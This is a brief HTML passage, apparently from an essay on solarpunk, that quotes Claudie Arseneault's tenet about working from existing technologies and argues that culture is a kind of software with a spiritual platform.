  <p><span>Claudie Arseneault, author of <i>Wings of Revival: A Solarpunk Dragon Anthology</i>, gives us the second tenet: “[Solarpunk should work] from existing technologies, from things we already know are possible.” This is key. There is no greater or more fundamental technology than culture. It, and the ark of ideologies that arise from it, are more than just peer pressure from dead people. Culture is <i>software.</i> And more often than not, that includes a spiritual platform.</span></p>
